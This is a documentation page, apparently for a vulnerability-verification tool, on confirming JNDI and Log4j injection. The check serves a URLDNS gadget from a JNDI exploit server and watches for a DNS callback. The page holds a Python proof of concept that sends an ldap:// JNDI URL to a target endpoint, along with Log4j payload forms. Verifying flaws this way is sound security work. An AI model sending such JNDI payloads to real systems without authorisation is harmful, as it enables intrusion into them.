# JNDI Injection Verification

Use for JNDI/LDAP/RMI injection vulnerabilities (including Log4j). The verification leverages JNDI-Exploit-Server to serve URLDNS gadgets that trigger DNS callbacks when looked up by the target application.

## How It Works

1. Fetch an OOB test domain from the OOB service
2. Construct JNDI URL pointing to exploit server with OOB domain path
3. Replace JNDI URL placeholder in PoC with the malicious URL
4. Execute PoC (sends JNDI URL to target application)
5. Target application performs JNDI lookup on the malicious URL
6. JNDI-Exploit-Server returns URLDNS gadget
7. Target deserializes gadget, triggering DNS query to OOB domain
8. Check if OOB domain received DNS query

## PoC Example

```python
import requests

from zast_verifier import config


if __name__ == "__main__":
    base_url = "https://example.vulnerable.web.app.com"
    jndi_url = "ldap://jndi.zast.ai:389/URLDNS"  # Will be replaced with actual malicious JNDI URL

    response = requests.get(
        url=f"{base_url}/api/lookup",
        params={"url": jndi_url},
        headers=config.get_admin_headers(),
        cookies=config.get_admin_cookies(),
    )

    print(f"Status code: {response.status_code}")
    print(f"Response text: {response.text}")
```

## Validation Command

```bash
zast-verifier validate-poc -c "%poc_code%" --method jndi --jndi-url-placeholder "ldap://jndi.zast.ai:389/URLDNS"
```

## Parameters

| Parameter               | Description                                                        | Required |
|-------------------------|--------------------------------------------------------------------|----------|
| `--method`              | Use `jndi` for this verification                                   | Yes      |
| `--jndi-url-placeholder`| JNDI URL placeholder in PoC to replace                             | Yes      |
| `--env-file`            | Path to environment file (default: `~/.config/zast-verifier/.env`) | No       |

## Notes

- The JNDI exploit server must support URLDNS gadget generation
- Common JNDI schemes: `ldap://`, `rmi://`, `dns://`
- Log4j payloads like `${jndi:ldap://...}` are also supported
- The placeholder must be the complete JNDI URL (not just the `${jndi:...}` wrapper)
